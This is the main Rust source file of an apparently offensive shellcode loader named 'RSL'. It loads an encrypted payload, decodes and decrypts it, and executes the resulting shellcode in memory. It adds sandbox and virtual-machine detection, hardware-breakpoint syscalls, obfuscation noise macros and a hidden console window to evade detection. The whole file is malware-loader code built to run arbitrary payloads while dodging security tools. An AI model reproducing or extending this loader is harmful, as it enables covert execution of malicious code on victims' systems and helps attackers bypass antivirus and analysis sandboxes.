#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
mod alloc;
#[cfg(feature = "with_bundling")]
mod bundle;
mod decode;
mod decrypt;
mod exec;
mod load;
mod ntapi;
#[cfg(feature = "sandbox")]
mod sandbox;
mod syscall;
mod utils;

use decode::decode;
use decrypt::decrypt;
use exec::exec;
use load::load;
use rsl_macros::obfuscation_noise_macro;
#[cfg(feature = "debug")]
use utils::{print_error, print_message, print_success};

fn start_program() {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::init_hw_syscalls();
    }
    obfuscation_noise_macro!();
    #[cfg(feature = "debug")]
    print_message("RSL started in debug mode.");
}

fn exit_program() -> ! {
    #[cfg(feature = "hw_syscall")]
    unsafe {
        syscall::hw_syscall::deinit_hw_syscalls();
    }
    #[cfg(feature = "debug")]
    print_message("Exiting program.");
    std::process::exit(1);
}

fn run() -> utils::RslResult<()> {
    #[cfg(feature = "sandbox")]
    if sandbox::guard_vm() {
        return Err(utils::RslError::SandboxDetected);
    } else {
        #[cfg(feature = "debug")]
        print_success("Passed Sandbox/VM detection.");
    }

    #[cfg(feature = "with_bundling")]
    {
        bundle::bundlefile()?;
        #[cfg(feature = "debug")]
        print_success("Bundling succeeded.");
        obfuscation_noise_macro!();
    }

    let encrypted_data = load()?;
    #[cfg(feature = "debug")]
    print_success("Payload loaded successfully.");

    obfuscation_noise_macro!();

    let decrypted_data = decode(&encrypted_data).unwrap();

    let (shellcode_ptr, shellcode_len) = unsafe { decrypt(&decrypted_data)? };
    #[cfg(feature = "debug")]
    print_success("Payload decrypted successfully.");

    obfuscation_noise_macro!();

    unsafe {
        exec(shellcode_ptr as usize, shellcode_len)?;
    }
    #[cfg(feature = "debug")]
    print_success("Payload executed successfully.");
    
    Ok(())
}

fn main() {
    start_program();

    if let Err(_e) = run() {
        #[cfg(feature = "debug")]
        print_error("Execution failed", &_e);
        exit_program();
    }

    exit_program();
}
